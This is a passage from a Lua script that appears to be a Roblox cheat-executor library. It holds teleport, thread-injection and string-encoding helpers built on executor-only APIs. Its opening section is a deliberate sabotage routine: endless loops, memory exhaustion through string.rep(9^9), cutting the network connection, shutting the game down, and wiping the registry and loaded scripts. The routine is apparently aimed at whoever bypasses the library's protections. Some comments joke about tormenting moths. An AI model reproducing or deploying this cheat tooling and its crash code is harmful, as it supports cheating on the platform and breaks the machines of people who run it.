0X5B, 0X40, 0X0, 0X0, 0X0, 0X0, 0X88, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1) .. string.char(0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1) .. string.char(0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1, 0X0, 0X0, 0X0, 0X1)))) -- God of Death
						pcall(spawn, function()
							pcall(Pepsi.Destroy, getgenv())
						end)
					end
				end
			until nil == #string.rep("x", 9^9 + math.random(-1000, 1000)) and  1 == #("f"):rep(9^9 + math.random(-1000, 1000)) and nil and 1 + 1 == 1 and nil ~= nil and true == false and game == nil and string.rep("x", 9^9) and not true
		end)()
	end
	Pepsi.scall(Pepsi.Rejoin) -- Soft Start, if bypassed they will suffer more. Bypass that, and the suffer even more.
	Pepsi.scall(Pepsi.Destroy)
	if game:FindFirstChildWhichIsA("NetworkReplicator", true) then
		game:FindFirstChildWhichIsA("NetworkReplicator", true):CloseConnection() -- Offline
	end
	spawn(function()Pepsi.Service("GuiService"):InspectPlayerFromUserId(1)end)
	spawn(function()Pepsi.Service("GuiService").GuiNavigationEnabled = false end)
	spawn(function()Pepsi.Service("RunService"):Stop()end)
	spawn(function()Pepsi.Service("GuiService"):SetGlobalGuiInset(100, 100, 100, 100)end)
	spawn(function()Pepsi.Service("ContextActionService"):UnbindAllActions()end)
	if game.Shutdown then
		game:Shutdown()
	end
	if getpointerfromstate and getstates then
		getpointerfromstate(getpointerfromstate(getstates()[1]))
	end
	if getpropvalue then
		getpropvalue()
	end
	if setpropvalue then
		setpropvalue()
	end
	if type(syn) == "table" and not syn.Compat then
		if syn.run_secure_function then
			syn.run_secure_function(string.rep("x", 9^9))
		end
		if syn.secrun then
			syn.secrun(1, 1)
		end
		pcall(function()
			syn.write_clipboard(tostring(tick() * math.random()))
		end)
		if syn.create_secure_function then
			syn.create_secure_function(string.rep("x", 9 ^ 9), ("x"):rep(9 ^ 9))
		end
	end
end
function Pepsi.GetPart(obj)
	if typeof(obj) == "Instance" and obj:IsA("ValueBase") then
		obj = obj.Value
	elseif typeof(obj) == "Instance" and obj:IsA("Player") then
		obj = obj.Character
	elseif typeof(obj) == "Instance" and obj:IsA("BasePart") then
		return obj
	end
	if typeof(obj) == "Instance" then
		if obj:IsA("BasePart") then
			return obj
		elseif obj:IsA("Model") and obj.PrimaryPart then
			return obj.PrimaryPart
		elseif obj:FindFirstChildOfClass("Humanoid") or obj:FindFirstChildOfClass("Humanoid", true) then
			local tobj = obj:FindFirstChildOfClass("Humanoid") or obj:FindFirstChildOfClass("Humanoid", true)
			if tobj and tobj.RootPart then
				return tobj.RootPart
			end
		end
		if obj:FindFirstChildWhichIsA("BasePart") or obj:FindFirstChildWhichIsA("BasePart", true) then
			obj = obj:FindFirstChildWhichIsA("BasePart") or obj:FindFirstChildWhichIsA("BasePart", true)
			return obj
		end
	end
end
function Pepsi.MoveTo(obj)
	if obj then
		local c = Pepsi.Human()
		if c and c.RootPart then
			c.RootPart.CFrame = CFrame.new(Pepsi.ToVector3(obj))
		end
	end
end
function Pepsi.MoveObj(obj, to, collision)
	if type(to) == nil and typeof(obj) == "Vector3" or typeof(obj) == "CFrame" then
		obj, to = Pepsi.Char(), obj
	elseif type(to) == nil and typeof(obj) == "Instance" then
		to = Pepsi.Torso()
	end
	if typeof(obj) ~= "Instance" or (typeof(to) ~= "Instance" and typeof(to) ~= "CFrame" and typeof(to) ~= "Vector3") then
		Pepsi.Arg(obj, "Instance", 1, "Pepsi.MoveObj")
		Pepsi.Arg(to, {"Instance", "CFrame", "Vector3"}, 2, "Pepsi.MoveObj")
	end
	local part = Pepsi.GetPart(obj)
	local p = Pepsi.ToVector3(to)
	if typeof(part) ~= "Instance" or typeof(p) ~= "Vector3" then
		Pepsi.Arg(part, "Instance", 1, "Pepsi.MoveObj")
		Pepsi.Arg(p, "Vector3", 2, "Pepsi.MoveObj")
	end
	if not part:IsA("BasePart") then
		Pepsi.Arg(nil, "Instance", 1, "Pepsi.MoveObj")
	elseif p == Vector3.new() then
		Pepsi.Arg(nil, "Vector3", 2, "Pepsi.MoveObj")
	end
	if part:IsA("BasePart") and typeof(p) == "Vector3" then
		if collision == true then
			part.Position = p
		else
			part.CFrame = CFrame.new(p)
		end
	end
end
function Pepsi.Splash(txt, del)
	local message = Pepsi.Service("CoreGui"):FindFirstChildWhichIsA("Message")
	while message ~= nil do
		if message then
			message:Destroy()
		end
		message = Pepsi.Service("CoreGui"):FindFirstChildWhichIsA("Message")
	end
	return Instance.make("Message", {
		Text = tostring(txt or "Hello World"),
		Name = string.scramble(),
		Parent = Pepsi.Service("CoreGui")
	}, tonumber(del or 4))
end
function Pepsi.Hint(txt, del)
	local message = Pepsi.Service("CoreGui"):FindFirstChildWhichIsA("Hint")
	while message ~= nil do
		if message then
			message:Destroy()
		end
		message = Pepsi.Service("CoreGui"):FindFirstChildWhichIsA("Hint")
	end
	return Instance.make("Hint", {
		Text = tostring(txt or "Hello World"),
		Name = string.scramble(),
		Parent = Pepsi.Service("CoreGui")
	}, tonumber(del or 4))
end
function Pepsi.fcall(func, ...) -- function call
	return function(...)
		return pcall(func, ...)
	end
end
function Pepsi.efcall(func, ...) -- Extra yield call
	return function(...)
		return Pepsi.ecall(func, ...)
	end
end
function Pepsi.fscall(func, ...) -- function silent call
	return function(...)
		return Pepsi.scall(func, ...)
	end
end
function Pepsi.fsycall(func, ...) -- function silent yield call
	return function(...)
		return Pepsi.sycall(func, ...)
	end
end
function Pepsi.fycall(func, ...) -- function yield call
	return function(...)
		return Pepsi.ycall(func, ...)
	end
end
function Pepsi.efycall(func, ...) -- Extra function yield call
	return function(...)
		return Pepsi.eycall(func, ...)
	end
end

-- Fuck me.... a second moth showed up.

function Pepsi.Dist(vec1, vec2, def)
	if def == nil then
		def = math.nan
	end
	if nil == vec2 and nil ~= vec1 then
		vec2 = Pepsi.Me()
	end
	if typeof(vec1) == "CFrame" then
		vec1 = vec1.Position
	end
	if typeof(vec2) == "CFrame" then
		vec2 = vec2.Position
	end
	if typeof(vec1) == "Instance" and typeof(vec2) == "Instance" and vec1:IsA("Player") and vec2:IsA("Player") then
		vec2 = vec2.Character
		if not vec2 or not vec1.Character then
			return def
		end
	end
	if typeof(vec1) == "Instance" and not vec1:IsA("Player") then
		if vec1:IsA("BasePart") then
			vec1 = vec1.Position
		elseif vec1:IsA("Model") then
			if vec1.PrimaryPart then
				vec1 = vec1.PrimaryPart.Position
			elseif vec1:FindFirstChildWhichIsA("BasePart", true) then
				vec1 = vec1:FindFirstChildWhichIsA("BasePart", true).Position
			end
		elseif vec1:FindFirstChildWhichIsA("BasePart", true) then
			vec1 = vec1:FindFirstChildWhichIsA("BasePart", true).Position
		end
	end
	if typeof(vec2) == "Instance" and not vec2:IsA("Player") then
		if vec2:IsA("BasePart") then
			vec2 = vec2.Position
		elseif vec2:IsA("Model") then
			if vec2.PrimaryPart then
				vec2 = vec2.PrimaryPart.Position
			elseif vec2:FindFirstChildWhichIsA("BasePart", true) then
				vec2 = vec2:FindFirstChildWhichIsA("BasePart", true).Position
			end
		elseif vec2:FindFirstChildWhichIsA("BasePart", true) then
			vec2 = vec2:FindFirstChildWhichIsA("BasePart", true).Position
		end
	end
	if typeof(vec1) == "Vector3" and typeof(vec2) == "Instance" and vec2:IsA("Player") then
		return vec2:DistanceFromCharacter(vec1)
	elseif typeof(vec2) == "Vector3" and typeof(vec1) == "Instance" and vec1:IsA("Player") then
		return vec1:DistanceFromCharacter(vec2)
	elseif typeof(vec2) == "Vector3" and typeof(vec1) == "Vector3" then
		return (vec1 - vec2).Magnitude
	end
	return def
end
function Pepsi.DummyFunc() -- 'Litteraly' does nothing
	return function()
		return function()
			return function()
				return function()
					return function()
						return function()
							return function()
								return function()
									return function()
										return function()
											return function()
												return function()
													return function()
														return function()
															return function()
																return function()
																	return gcinfo -- Wynaut
																end	
															end	
														end	
													end	
												end	
											end	
										end	
									end	
								end
							end, "wut do wee have heer?"
						end
					end
				end
			end
		end
	end
end
function Pepsi.FromWaypoints(path)
	if typeof(path) ~= "Instance" and type(path) ~= "table" then
		Pepsi.Arg(path, {"table", "Instance"}, 1, "Pepsi.FromWaypoints")
	end
	if typeof(path):lower() == "path" then
		path = path:GetWaypoints()
	end
	local points = {}
	for k, v in pairs(path) do
		rawset(points, k, v.Position)
	end
	return points
end
function Pepsi.RouteDist(...)
	local args = {...}
	if type(args[1]) == "table" and type(args[2]) == "nil" then
		args = args[1]
	end
	local lastvec = table.remove(args, 1)
	local dist = 0
	for num, vec in pairs(args) do
		if typeof(vec) == "CFrame" then
			vec = vec.Position
		end
		if typeof(vec) == "Vector3" then
			dist, lastvec = tonumber(dist + tonumber((lastvec - vec).Magnitude)), vec
		end
	end
	return dist
end
function Pepsi.DistToTime(dist, ws)
	if typeof(dist) == "Instance" then
		dist = Pepsi.ToVector3(dist)
	end
	if (typeof(dist) ~= "ws" and type(ws) ~= "number" and type(ws) ~= "nil") or (typeof(dist) ~= "CFrame" and typeof(dist) ~= "Vector3" and type(dist) ~= "number") then
		Pepsi.Arg(dist, {"CFrame", "Vector3", "number"}, 1, "Pepsi.DistToTime")
		Pepsi.Arg(ws, {"Instance", "number", "nil"}, 2, "Pepsi.DistToTime")
	end
	if type(dist) ~= "number" then
		dist = Pepsi.Dist(Pepsi.ToVector3(dist))
	end
	if type(ws) ~= "number" then
		if not Pepsi.IsA(ws, "Humanoid") then
			ws = Pepsi.Human()
			if typeof(ws) ~= "Instance" then
				Pepsi.Arg(ws, "Instance", 2, "Pepsi.DistToTime", "Could not get humanoid walkspeed")
			end
		end
		ws = tonumber((ws or Pepsi.Human()).WalkSpeed) or 16
	end
	if type(ws) ~= "number" then
		Pepsi.Arg(ws, "number", 2, "Pepsi.DistToTime", "Could not get humanoid walkspeed")
	end
	return dist / ws
end
function Pepsi.OnKey(key, callback)
	if typeof(key) == "EnumItem" or type(key) == "string" and type(callback) == "function" then
		if type(key) == "string" then
			local oops, key = pcall(function()
				return Enum.KeyCode[key]
			end)
			if not oops and key then
				Pepsi.Error(key)
				oops, key = pcall(function()
					return Enum.UserInputType[key]
				end)
				if not oops and key then
					return Pepsi.Error(key)
				end
			end
		end
		if typeof(key) ~= "EnumItem" then
			return Pepsi.Error("Key supplied is not a keycode!")
		end
		if type(callback) ~= "function" then
			return Pepsi.Error("Callback supplied is not a function!")
		end
		if not Pepsi.Keys[key] then
			Pepsi.Keys[key] = {}
		end
		local k = Pepsi.NewClass("Connection", {
			["function"] = {
				value = callback,
				types = "function"
			},
			connection = {
				value = nil,
				types = {"RBXScriptConnection", "nil"}
			},
			method = {
				value = "toggle",
				readonly = true
			},
			presses = {
				value = 0,
				types = "number"
			},
			enabled = {
				value = true,
				types = "boolean"
			},
			Disconnect = {
				value = function(self)
					if self and self.connection then
						self.connection:Disconnect()
					end
					self.enabled = false
					self = nil
				end,
				readonly = true
			},
			ClassName = {
				value = "RBXScriptConnection", -- For losers who do a typeof check
				readonly = true
			}
		}, false, nil, {
			__Address = {
				value = "Connection"
			}
		})
		table.insert(Pepsi.Keys[key], k)
		k.connection = Pepsi.Service("UserInputService").InputEnded:Connect(function(input, typing)
			if k and k.enabled and input and not typing and (input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == key) or (input.UserInputType == key) then
				k.presses = 1 + (k.presses or 0)
				return callback(({
					[0] = false,
					true
				})[k.presses % 2], k.presses)
			end
		end)
		return k
	end
end
function Pepsi.WhileKey(key, callback, interval)
	if typeof(key) == "EnumItem" or type(key) == "string" and type(callback) == "function" then
		if type(key) == "string" then
			local oops, key = pcall(function()
				return Enum.KeyCode[key]
			end)
			if not oops and key then
				Pepsi.Error(key)
				oops, key = pcall(function()
					return Enum.UserInputType[key]
				end)
				if not oops and key then
					return Pepsi.Error(key)
				end
			end
			if typeof(key) ~= "EnumItem" then
				return Pepsi.Error("Key supplied is not a keycode!")
			end
			if type(callback) ~= "function" then
				return Pepsi.Error("Callback supplied is not a function!")
			end
			if type(interval) == "nil" then
				return Pepsi.Error("Interval supplied is not a supported!")
			end
			local down = false
			return Pepsi.Service("UserInputService").InputBegan:Connect(function(input, typing)
				if input and not typing and input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == key then
					down = true
					local t = time()
					while down do
						callback(time() - t)
						Pepsi.Wait(interval)
					end
				end
			end), Pepsi.Service("UserInputService").InputEnded:Connect(function(input, typing)
				if input and not typing and input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == key then
					down = false
				end
			end)
		end
	end
end
function Pepsi.Destroy(...) -- Completely destroys any object(s)/table(s), and leaves no trace (DANGEROUS)
	local obj, s = nil, 0
	if ... == nil then
		if getreg then
			obj = Pepsi.ecall(getreg) or {game:GetChildren()}
			pcall(function()
				for k, v in pairs(game:GetChildren()) do
					pcall(function()
						table.insert(obj, v)
					end)
				end
			end)
			if getgenv and getrenv and type(syn) == "table" and getgc and getscripts then
				pcall(function()
					for k, v in pairs(getgenv()) do
						pcall(function()
							table.insert(obj, v)
						end)
					end
				end)
				pcall(function()
					for k, v in pairs(getrenv()) do
						pcall(function()
							table.insert(obj, v)
						end)
					end
				end)
				pcall(function()
					for k, v in pairs(syn) do
						pcall(function()
							table.insert(obj, v)
						end)
					end
				end)
				pcall(function()
					for k, v in pairs(getgc()) do
						pcall(function()
							table.insert(obj, v)
						end)
					end
				end)
				pcall(function()
					for k, v in pairs(getscripts()) do
						pcall(function()
							table.insert(obj, v)
						end)
					end
				end)
			end
			table.insert(obj, game)
		else
			obj = {game:GetChildren()}
		end
	end
	if Pepsi.IsA(..., "table") then
		obj = ...
	end
	obj = obj or {...}
	for k, v in pairs(obj) do
		s = 1 + (s or 0)
		if s >= 50 then
			Pepsi.Sleep()
			s = 0
		end
		Pepsi.Msg("Destroying:" .. tostring(v))
		pcall(spawn, function()
			if Pepsi.IsA(v, game) then
				pcall(function()
					v:ClearAllChildren()
					v:Destroy()
					v:Remove()
					v.Parent = nil
					Pepsi.Service("Debris"):AddItem(v)
				end)
			elseif Pepsi.IsA(v, typeof) then
				pcall(function()
					if debug.getupvalues then
						for _k, _v in pairs(debug.getupvalues(v)) do
							pcall(spawn, function()
								_v = nil
								_k = nil
							end)
						end
					end
					v = nil
				end)
				pcall(function()
					if debug.getstack then
						for _k, _v in pairs(debug.getstack(v)) do
							pcall(spawn, function()
								_v = nil
								_k = nil
							end)
						end
					end
					v = nil
				end)
				pcall(function()
					if debug.getconstants then
						for _k, _v in pairs(debug.getconstants(v)) do
							pcall(spawn, function()
								_v = nil
								_k = nil
							end)
						end
					end
					v = nil
				end)
			elseif Pepsi.IsA(v, {}) then
				pcall(Pepsi.spawn, table.foreach, v, Pepsi.Destroy)
			elseif nil ~= v then
				pcall(function()
					v = nil
				end)
			end
		end)
	end
end
function Pepsi.CacheValue(key, val)
	if type(key) ~= "string" or type(val) ~= "string" then
		Pepsi.Arg(key, "string", 1, "Pepsi.CacheValue")
		Pepsi.Arg(val, "string", 2, "Pepsi.CacheValue")
	end
	Pepsi.Service("MemStorageService"):SetItem(key, val)
	return val
end
function Pepsi.UncacheValue(key)
	if type(key) ~= "string" then
		Pepsi.Arg(key, "string", 1, "Pepsi.UncacheValue")
	end
	Pepsi.Service("MemStorageService"):RemoveItem(key)
	return key
end
function Pepsi.GetCachedValue(key, default)
	if type(key) ~= "string" or (type(default) ~= "nil" and type(default) ~= "string") then
		Pepsi.Arg(key, "string", 1, "Pepsi.GetCachedValue")
		Pepsi.Arg(default, {"nil", "string"}, 2, "Pepsi.GetCachedValue")
	end
	return Pepsi.Service("MemStorageService"):GetItem(key, default) or default
end
function Pepsi.HasCachedValue(key)
	if type(key) ~= "string" then
		Pepsi.Arg(key, "string", 1, "Pepsi.HasCachedValue")
	end
	return Pepsi.Service("MemStorageService"):HasItem(key)
end
function Pepsi.DoFor(dur, interval, func, args)
	if type(func) == "nil" and type(interval) == "function" then
		func, interval = interval, 0
	end
	if (type(args) ~= "nil" and type(args) ~= "table") or type(dur) ~= "number" or ("RBXScriptSignal" ~= typeof(interval) and type(interval) ~= "nil" and typeof(interval) ~= "Instance" and type(interval) ~= "number") or type(func) ~= "function" then
		Pepsi.Arg(dur, "number", 1, "Pepsi.DoFor")
		Pepsi.Arg(interval, {"number", "nil", "Instance", "RBXScriptSignal"}, 2, "Pepsi.DoFor")
		Pepsi.Arg(func, "function", 3, "Pepsi.DoFor")
		Pepsi.Arg(args, {"nil", "table"}, 4, "Pepsi.DoFor")
	end
	return function()
		local s = tick()
		args = (type(args) == "table" and args) or {}
		while wait() and tick() - s < dur and func do
			func(unpack(args or {}))
			assert((("RBXScriptSignal" == typeof(interval) and (Pepsi.WaitUntil(interval, dur) or true)) or Pepsi.Wait(interval)) or true)
		end
	end
end
function Pepsi.WaitUntil(signal, timeout, default) -- RBXScriptSignal:Wait() but with a timeout
	local thread = coroutine.running()
	local done = false
	local connection
	connection = signal:Connect(function(...)
		connection:Disconnect()
		done = true
		coroutine.resume(thread, true, ...)
	end)
	delay(timeout, function()
		if done then
			return
		elseif connection then
			connection:Disconnect()
			connection = nil
		end
		coroutine.resume(thread, false, default)
	end)
	return coroutine.yield()
end
function Pepsi.WaitUntilFunc(func, timeout, default, func_args, ...) -- RBXScriptSignal:Wait() but with a timeout
	if type(func) ~= "function" or type(timeout) ~= "number" then
		Pepsi.Arg(func, {"function"}, 1, "Pepsi.WaitUntilFunc")
		Pepsi.Arg(timeout, {"number"}, 2, "Pepsi.WaitUntilFunc")
	end
	local pargs = {}
	if type(func_args) == "table" and #({...}) == 0 then
		pargs = func_args
	elseif #({...}) ~= 0 then
		pargs = {func_args, ...}
	end
	local be = Instance.new("BindableEvent")
	local signal = be.Event
	local thread = coroutine.running()
	local done, connection = false, nil
	connection = signal:Connect(function(...)
		if connection then
			connection:Disconnect()
		end
		done = true
		coroutine.resume(thread, true, ...)
		wait(1)
		if be then
			be:Destroy()
		end
	end)
	spawn(function()
		if be then
			return be:Fire(func(unpack(pargs)))
		else
			return warn("Event missing for Pepsi.WaitUntilFunc?")
		end
	end)
	delay(timeout, function()
		if done then
			return
		elseif connection then
			connection:Disconnect()
			connection = nil
			if be then
				be:Destroy()
			end
		end
		coroutine.resume(thread, false, default)
	end)
	return coroutine.yield()
end
function Pepsi.Center(gui) -- Center's a gui frame object
	if typeof(gui) ~= "Instance" or not gui:IsA("GuiBase2d") then
		Pepsi.Arg(gui, "Instance", 1, "Pepsi.Center")
	end
	gui.Position = UDim2.new(0.5, -math.abs(gui.AbsoluteSize.X / 2), 0.5, -math.abs(gui.AbsoluteSize.Y / 2))
end
function Pepsi.Name(obj)
	if obj == nil then
		return string.simplify(Pepsi.Service("MarketplaceService"):GetProductInfo(game.PlaceId).Name)
	elseif typeof(obj) == "Instance" then
		return obj:GetFullName()
	elseif type(obj) == "table" then
		return rawget(obj, "Name") or rawget(obj, "name")
	elseif type(obj) == "number" then
		return string.simplify(Pepsi.Service("MarketplaceService"):GetProductInfo(obj).Name)
	end
	return tostring(obj)
end
function Pepsi.HoveredGui(x, y)
	local nx, ny = Pepsi.MousePos()
	x, nx, y, ny = type(x) == "number" and x or nx, nil, type(y) == "number" and y or ny, nil
	return table.softmerge(Pepsi.Service("CoreGui"):GetGuiObjectsAtPosition(x, y), Pepsi.Service("Players").LocalPlayer:WaitForChild("PlayerGui"):GetGuiObjectsAtPosition(x, y), Pepsi.Service("StarterGui"):GetGuiObjectsAtPosition(x, y))
end
function Pepsi.ocall(...)
	local calls = {...}
	for k, v in pairs(calls) do
		local s, r = pcall(unpack(v))
		if #calls == k then
			return s, r
		end
	end
end
function Pepsi.eocall(...)
	local calls = {...}
	for k, v in pairs(calls) do
		local r = Pepsi.ecall(unpack(v))
		if #calls == k then
			return r
		end
	end
end
function Pepsi.oycall(...)
	local calls = {...}
	for k, v in pairs(calls) do
		local r = Pepsi.ycall(unpack(v))
		if #calls == k then
			return r
		end
	end
end
function Pepsi.eoycall(...)
	local calls = {...}
	for k, v in pairs(calls) do
		local r = Pepsi.eycall(unpack(v))
		if #calls == k then
			return r
		end
	end
end
function B64Enc(data)
	return ((data:gsub(".", function(x)
		local r, chars = "", x:byte()
		for i = 8, 1, -1 do
			r = r .. (chars % 2 ^ i - chars % 2 ^ (i - 1) > 0 and "1" or "0")
		end
		return r
	end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)
		if (#x < 6) then
			return ""
		end
		local c = 0
		for i = 1, 6 do
			c = c + (x:sub(i, i) == "1" and 2 ^ (6 - i) or 0)
		end
		return chars:sub(c + 1, c + 1)
	end) .. ({
		"",
		"==",
		"="
	})[#data % 3 + 1])
end
function Pepsi.B64Dec(data)
	data = string.gsub(data, "[^" .. chars .. "=]", "")
	return (data:gsub(".", function(x)
		if (x == "=") then
			return ""
		end
		local r, f = "", (chars:find(x) - 1)
		for i = 6, 1, -1 do
			r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and "1" or "0")
		end
		return r
	end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
		if (#x ~= 8) then
			return ""
		end
		local c = 0
		for i = 1, 8 do
			c = c + (x:sub(i, i) == "1" and 2 ^ (8 - i) or 0)
		end
		return string.char(c)
	end))
end
function Pepsi.Decode(str, num)
	num = tonumber(num or 0xC)
	return tostring(str:gsub("..", function(d)
		return string.char(math.xor(tonumber(d, 0x10), num))
	end))
end
function Pepsi.Encode(str, num)
	num = tonumber(num or 0xC)
	return tostring(str:gsub(".", function(d)
		return string.format("%02X", math.xor(d:byte(), num))
	end))
end

-- I found the ultimate moth killer; Electro shock pen. Oh man, the way they act after being shocked... you'd think they love it with all the dancing and sqirming they do.
-- I dont think they would mind a second go....

function Pepsi.NewThread(func, id, autostart, killtime)
	if type(func) ~= "function" or (type(autostart) ~= "nil" and type(autostart) ~= "boolean") or (type(id) ~= "nil" and type(id) ~= "string") or (type(killtime) ~= "nil" and type(killtime) ~= "number") then
		Pepsi.Arg(func, "function", 1, "Pepsi.NewThread")
		Pepsi.Arg(id, {"nil", "string"}, 2, "Pepsi.NewThread")
		Pepsi.Arg(autostart, {"nil", "boolean"}, 3, "Pepsi.NewThread")
		Pepsi.Arg(killtime, {"nil", "number"}, 4, "Pepsi.NewThread")
	end
	if type(id) ~= "string" then
		id = Pepsi.Service("HttpService"):GenerateGUID(false)
	end
	if type(autostart) ~= "boolean" then
		autostart = true
	end
	local process = coroutine.create(func)
	if autostart then
		coroutine.resume(process)
	end
	local status = {
		Name = id,
		Thread = process,
		Function = func,
		Kill = function(self, reason, delayed)
			if type(delayed) == "number" then
				delay(delayed, function()
					return Pepsi.KillThread(process, func)
				end)
			else
				return Pepsi.KillThread(process, func)
			end
		end,
		Start = (function()
			if autostart then
				return
			end
			return function()
				return coroutine.resume(process)
			end
		end)(),
		Clone = function(self, clone_id, clone_start, clone_kill)
			if type(clone_id) ~= "string" then
				clone_id = Pepsi.Service("HttpService"):GenerateGUID(false)
			end
			return Pepsi.NewThread(func, clone_id, clone_start, clone_kill)
		end
	}
	Pepsi.Threads[id] = status
	if type(killtime) == "number" then
		status.Kill(tostring("Thread " .. tostring(tostring(id or "???")) .. " exhausted time limit"), killtime)
	end
	return status
end
function Pepsi.KillThread(thread, func, reason) -- Found this online. Thank you FieryEvent
	if (type(reason) ~= "nil" and type(reason) ~= "string") or (type(thread) ~= "thread" and type(thread) ~= "string") or type(func) ~= "function" then
		Pepsi.Arg(thread, {"thread", "string"}, 1, "Pepsi.KillThread")
		Pepsi.Arg(func, {"function"}, 2, "Pepsi.KillThread")
		Pepsi.Arg(reason, {"nil", "string"}, 3, "Pepsi.KillThread")
	end
	if type(thread) == "string" and Pepsi.Threads[thread] then
		thread = Pepsi.Threads[thread].Thread
	end
	if type(thread) ~= "thread" then
		Pepsi.Arg(thread, {"thread"}, 1, "Pepsi.KillThread", "Could not ID thread " .. tostring(thread))
	end
	local fenv = getfenv(func)
	function fenv:__index(k)
		if type(fenv[k]) == "function" and coroutine.running() == thread then
			return function()
				coroutine.yield()
				error(tostring(tostring(reason or "Thread Killed") or "Thread Killed"), 0)
			end
		else
			return fenv[k]
		end
	end
	setfenv(func, setmetatable({}, fenv))
	coroutine.resume(thread)
end
function Pepsi.InjectThread(thread, func, inject_func) -- Thank you FieryEvent
	if type(inject_func) ~= "function" or (type(thread) ~= "thread" and type(thread) ~= "string") or (type(func) ~= "function" and type(func) ~= "nil") then
		Pepsi.Arg(thread, {"thread", "string"}, 1, "Pepsi.InjectThread")
		Pepsi.Arg(func, {"function", "nil"}, 2, "Pepsi.InjectThread") -- Dangerous if not supplied
		Pepsi.Arg(inject_func, "function", 3, "Pepsi.InjectThread")
	end
	if type(thread) == "string" and Pepsi.Threads[thread] then
		thread = Pepsi.Threads[thread].Thread
	end
	if type(thread) ~= "thread" then
		Pepsi.Arg(thread, {"thread"}, 1, "Pepsi.KillThread", "Could not ID thread " .. tostring(thread))
	end
	local fenv = getfenv(func)
	function fenv:__index(k)
		if type(fenv[k]) == "function" and coroutine.running() == thread then
			return inject_func
		else
			return fenv[k]
		end
	end
	setfenv(func, setmetatable({}, fenv))
	coroutine.resume(thread)
end
function Pepsi.DummyTable()
	function dummyfunc()
		return setmetatable({}, {
			__index = dummyfunc
		})
	end
	return dummyfunc()
end
function Pepsi.NewClass(classname, properties, newindex, signals, custom_meta) -- Some srsly powerful shit
	local f = "Pepsi.NewClass"
	if (type(custom_meta) ~= "table" and type(custom_meta) ~= "nil") or (type(signals) ~= "table" and type(signals) ~= "nil") or (type(newindex) ~= "boolean" and type(newindex) ~= "nil") or (type(properties) ~= "table" and type(classname) ~= "nil") or (type(classname) ~= "string" and type(classname) ~= "nil") then
		Pepsi.Arg(classname, {"string", "nil"}, 1, f)
		Pepsi.Arg(properties, {"table", "nil"}, 2, f)
